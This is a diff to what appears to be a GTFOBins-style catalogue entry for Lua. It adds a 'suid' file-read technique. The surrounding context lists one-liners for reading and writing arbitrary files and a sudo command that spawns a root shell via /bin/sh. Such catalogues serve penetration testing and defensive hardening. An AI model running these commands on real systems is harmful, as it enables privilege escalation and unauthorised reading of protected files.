@@ -59,6 +59,8 @@ functions:
     - code: lua -e 'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);'
   file-read:
     - code: lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
+  suid:
+    - code: lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
   sudo:
     - code: sudo lua -e 'os.execute("/bin/sh")'
   limited-suid:
